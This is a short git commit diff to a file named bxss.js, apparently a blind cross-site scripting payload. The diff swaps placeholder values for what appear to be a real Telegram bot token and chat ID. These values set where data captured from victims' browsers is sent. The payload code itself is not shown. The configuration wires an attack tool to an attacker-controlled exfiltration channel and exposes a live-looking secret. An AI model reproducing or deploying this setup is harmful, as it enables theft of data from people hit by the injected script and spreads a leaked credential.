714eab2860e90229ae4dacc8cfafa2c9904acbcd
trhacknon <129875733+tucommenceapousser@users.noreply.github.com>
2023-05-05 23:51:37 +0200

    Update bxss.js

--- bxss.js
+++ bxss.js
@@ -1,5 +1,5 @@
-var tokenBot = '31337317:L3e-7h4x00r_1tsr4md0mbruHhh000'; // Your "tokenBot" Here
-var chatId = '31337'; // Your "chatId" Here
+var tokenBot = '6003683438:AAEHevPU8UW5paysUEZUsq0FbiaBzdjQQLw'; // Your "tokenBot" Here
+var chatId = '-1001690993326'; // Your "chatId" Here
 
 /*
 	 _                     _       _      
